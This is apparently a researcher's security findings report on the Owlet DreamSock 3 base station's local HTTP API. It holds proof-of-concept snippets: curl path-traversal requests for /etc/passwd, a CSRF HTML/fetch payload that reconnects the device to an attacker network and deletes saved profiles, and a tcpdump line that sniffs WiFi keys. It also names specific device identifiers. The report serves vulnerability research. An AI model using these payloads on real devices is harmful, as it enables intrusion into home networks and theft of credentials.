# Security Findings - Owlet DreamSock 3 Base Station

**Device**: Owlet DreamSock 3 Base Station
**DSN**: AC000W025363194
**Firmware**: B1.0.3-c9c4_S1.0.4-64c1_BB0.7.34_SB0.7.33_SD6.1.1
**Ayla Module**: AY001MTL1 v2.9.11 (Build: 2a228da, Nov 16 2021)

---

## FINDING 1: Authentication Bypass / Information Disclosure ⚠️

**Severity**: Medium
**Endpoint**: `/wifi_status.json`
**Type**: Information Disclosure / Broken Authentication

### Description

The `/wifi_status.json` endpoint exhibits different behavior based on the presence of an `Authorization` header, **regardless of whether the header value is valid**.

### Proof of Concept

**Without authentication header:**
```bash
curl http://192.168.0.1/wifi_status.json
# Returns: 1 connection history entry
```

**With invalid/dummy authentication header:**
```bash
curl -H "Authorization: Bearer test" http://192.168.0.1/wifi_status.json
# Returns: 5 connection history entries
```

### Evidence

- File: `recon/api/wifi_status.json` - 30 lines, 1 entry
- File: `recon/api/wifi_status.auth_bearer_test_header.json` - 82 lines, 5 entries

**Data revealed with dummy auth header:**
- 5 connection attempts vs 1
- SSIDs attempted: "rt", "tt", "cr" (truncated names)
- All attempts show error codes (2=timeout, 4=SSID not found)
- Connection timestamps (mtime values)
- Full connection history instead of just latest

### Impact

1. **Information Disclosure**: Attackers can view full WiFi connection history
2. **Privacy Violation**: Reveals all networks the owner attempted to connect to
3. **Potential Auth Bypass**: API doesn't validate authentication tokens
4. **Attack Surface**: Suggests other endpoints may have similar issues

### Exploitation

An attacker on the local network can:
1. Enumerate all WiFi networks the device owner has tried to connect to
2. Potentially use this info for social engineering
3. Identify patterns in network naming (home network, office, etc.)
4. Test if other endpoints expose additional data with auth headers

### Recommended Testing

```bash
# Test all known endpoints with dummy auth header:
for endpoint in status.json wifi_scan_results.json wifi_profiles.json; do
    echo "Testing $endpoint"
    curl http://192.168.0.1/$endpoint > no_auth.json
    curl -H "Authorization: Bearer test" http://192.168.0.1/$endpoint > with_auth.json
    diff no_auth.json with_auth.json
done
```

---

## FINDING 2: Outdated Ayla Networks Module

**Severity**: Medium
**Component**: Ayla Networks WiFi Module AY001MTL1
**Type**: Vulnerable Dependencies

### Description

The device runs Ayla Networks module firmware version **2.9.11** built on **November 16, 2021** (over 3 years old at time of analysis).

### Evidence

From `/status.json`:
```json
{
  "model": "AY001MTL1",
  "version": "2.9.11",
  "build": "bc 2.9.11 11/16/21 12:40:13 ID 2a228da"
}
```

### Impact

1. Likely contains known security vulnerabilities
2. Missing security patches from past 3 years
3. Potentially vulnerable to Ayla-specific exploits
4. Related Owlet Cam devices had CVE-2023-6321 (command injection)

### Recommended Actions

- Search for CVEs affecting Ayla 2.9.x
- Research AY001MTL1 known vulnerabilities
- Check if firmware updates are available
- Search for firmware by build ID: `2a228da`

---

## FINDING 3: No CSRF Protection

**Severity**: Medium
**Type**: Cross-Site Request Forgery (CSRF)

### Description

Web interface and API endpoints lack CSRF protection. All state-changing operations can be triggered via simple GET/POST requests with no tokens.

### Evidence

Analysis of `app/wifi.js` shows:
- No CSRF token generation (lines 1-503)
- No token validation
- State-changing operations via simple POST requests
- WiFi connection via: `POST /wifi_connect.json?ssid=X&key=Y`
- Profile deletion via: `DELETE /wifi_profile.json?ssid=X`

### Proof of Concept

An attacker can create a malicious webpage that automatically:
```html
<!-- Force device to connect to attacker's network -->
<img src="http://192.168.0.1/wifi_connect.json?ssid=EvilNetwork&key=EvilPass">

<!-- Delete all WiFi profiles -->
<script>
fetch('http://192.168.0.1/wifi_profile.json?ssid=HomeNetwork', {method: 'DELETE'});
</script>
```

### Impact

If a user on the local network visits an attacker-controlled webpage while connected to the Owlet device network, the attacker can:
- Force the device to connect to a malicious WiFi network
- Delete existing WiFi profiles
- Disrupt device operation
- Potentially MITM the device's cloud connection

---

## FINDING 4: Plaintext WiFi Credentials in URL Parameters

**Severity**: High
**Type**: Insecure Credential Handling

### Description

WiFi passwords are transmitted in **URL query parameters** over **unencrypted HTTP** (port 80).

### Evidence

From `app/wifi.js` lines 223-240:
```javascript
function conn_start(password, networkId) {
  let networkParams = "wifi_connect.json?" + ssid_or_bssid(networkId);
  if (password != "") {
    networkParams += "&key=" + encodeURIComponent(password);
  }
  send_async_req("POST", networkParams, 1000, wifi_connect_resp);
}
```

Request format:
```
POST http://192.168.0.1/wifi_connect.json?ssid=MyNetwork&key=MyPassword123
```

### Impact

1. **WiFi credentials visible in:**
   - Browser history
   - Web server access logs
   - HTTP proxy logs
   - Network traffic (anyone sniffing)
   - Referer headers (if page makes external requests)

2. **Man-in-the-Middle**: Anyone on the network can sniff credentials
3. **Replay attacks**: Credentials can be captured and replayed

### Attack Scenario

```bash
# Attacker on same network captures WiFi password
sudo tcpdump -i wlan0 -A 'host 192.168.0.1 and port 80' | grep 'key='

# Example capture:
# POST /wifi_connect.json?ssid=MyHomeWiFi&key=SuperSecret123
```

---

## FINDING 5: Potential Path Traversal

**Severity**: To Be Tested
**Type**: Path Traversal / Local File Inclusion

### Description

Multiple endpoints may be vulnerable to path traversal attacks. The web server's 404 handler suggests it processes paths.

### Testing Required

```bash
# Test if we can read system files
curl http://192.168.0.1/../../etc/passwd
curl http://192.168.0.1/../../proc/version
curl http://192.168.0.1/../../dev/mtd0

# Test via known endpoints
curl http://192.168.0.1/test/../../etc/passwd
curl 'http://192.168.0.1/wifi_status.json?../../etc/passwd'
```

**Status**: Not yet tested (device offline during analysis)

---

## FINDING 6: Limited Attack Surface

**Severity**: Info
**Type**: Attack Surface

### Description

Port scan reveals only HTTP (port 80) is exposed. No debug services found.

### Evidence

From `recon/scans/owlet_scan.txt`:
```
PORT   STATE SERVICE
80/tcp open  http
```

Tested ports:
- 22/tcp (SSH): closed
- 23/tcp (Telnet): closed
- 443/tcp (HTTPS): closed
- 8080/tcp (HTTP-Alt): closed

### Notes

This limits remote attack vectors but doesn't eliminate them:
- HTTP on port 80 is the main attack surface
- All attacks must go through web interface/API
- No direct shell access services exposed

---

## FINDING 7: Minimal Endpoint Enumeration

**Severity**: Info
**Type**: Attack Surface

### Description

Most debug/admin endpoints tested returned 404.

### Results

| Endpoint | Status | Notes |
|----------|--------|-------|
| `/status.json` | ✅ 200 | Reveals version info |
| `/test` | ✅ 200 | Returns "0123456789" columns |
| `/wifi_status.json` | ✅ 200 | Main WiFi status API |
| `/wifi_scan_results.json` | ✅ 200 | WiFi scan results |
| `/wifi_profiles.json` | ✅ 200 | Saved WiFi profiles |
| `/wifi_connect.json` | ✅ POST | Connect to WiFi |
| `/wifi_profile.json` | ✅ DELETE | Delete profile |
| `/properties` | ⚠️ 403 | Forbidden (exists!) |
| All others | ❌ 404 | admin, debug, config, firmware, ota, logs, diagnostics, factory |

**Note**: `/properties` returning **403 Forbidden** (not 404) suggests it exists but requires authentication.

---

## FINDING 8: No TLS/HTTPS

**Severity**: High
**Type**: Insecure Transport

### Description

Device only serves HTTP on port 80. No HTTPS available.

### Impact

All communications are unencrypted:
- WiFi passwords transmitted in plaintext
- Session data (if any) unencrypted
- API responses can be intercepted
- Man-in-the-middle attacks trivial

---

## Testing Status Summary

| Test Type | Status | Result |
|-----------|--------|--------|
| Endpoint Discovery | ✅ Complete | 7 endpoints found, 1 forbidden |
| Auth Header Testing | ⚠️ Partial | Information disclosure found |
| Command Injection | ❌ Not tested | Device was offline |
| Path Traversal | ❌ Not tested | Device was offline |
| CSRF Testing | ❌ Not tested | Requires victim browser |
| XSS Testing | ❌ Not tested | Device was offline |

---

## Recommended Next Steps

### High Priority

1. **Test `/properties` endpoint with auth headers**
   - Returned 403 (Forbidden) - likely requires auth
   - Try various auth header combinations
   - May reveal additional device properties

2. **Complete auth header enumeration**
   - Run `scripts/test_auth_headers.sh`
   - Test all endpoints with various auth schemes
   - Document what each header reveals

3. **Test command injection**
   - Run `scripts/timing_based_injection_test.sh`
   - May lead to root shell (like CVE-2023-6321 on Owlet Cam)

### Medium Priority

4. **Path traversal testing**
   - Attempt to read `/etc/passwd`, `/proc/version`
   - Try to access `/dev/mtdblock0` (firmware)

5. **Search for firmware**
   - Use build ID: `2a228da`
   - Search GitHub, FCC database, Google
   - Check Ayla Networks OTA servers

6. **CSRF proof-of-concept**
   - Create malicious HTML page
   - Test if we can force WiFi connection changes

### Research

7. **Ayla Networks AY001MTL1 research**
   - Find datasheet/specifications
   - Check for known CVEs
   - Identify debug interfaces (UART?)

8. **Ayla API enumeration**
   - Test cloud endpoints with DSN
   - Look for firmware URLs
   - Check for API authentication bypass

---

## Device Information Reference

```
DSN: AC000W025363194
Model: AY001MTL1
Ayla Version: 2.9.11
Build ID: 2a228da
Build Date: 2021-11-16 12:40:13
MAC (AP): 26:cd:8d:e2:99:3a
MAC (STA): 24:cd:8d:e2:99:3a
Device Service: SS3-Sleep-1a2039d9-device.aylanetworks.com
FCC ID: 2AIEP-0BL3A
```
